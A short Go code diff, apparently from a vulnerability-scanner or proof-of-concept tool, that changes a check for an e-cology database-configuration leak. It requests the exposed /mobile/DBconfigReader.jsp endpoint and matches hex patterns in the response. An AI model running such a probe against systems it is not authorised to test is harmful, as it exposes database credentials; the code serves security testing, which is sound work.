@@ -61,8 +61,11 @@ func E_Cology_Database_Leak(u string) bool {
 	header["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
 	header["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
 	if req, err := pkg.HttpRequset(u+"/mobile/DBconfigReader.jsp", "GET", "", false, header); err == nil {
+		hexStr := fmt.Sprintf("%x", req.Body)
+		//pkg.GoPocLog(hexStr)
+		//bodyStr := string(req.Body)
 
-		if req.StatusCode == 200 && strings.Contains(req.Body, "\x") {
+		if req.StatusCode == 200 && (strings.Contains(hexStr, "7005536e") || strings.Contains(hexStr, "70054073")) {
 			body := req.Body
 			s := bytes.Replace([]byte(body), []byte("\r\n"), []byte(""), -1)
 
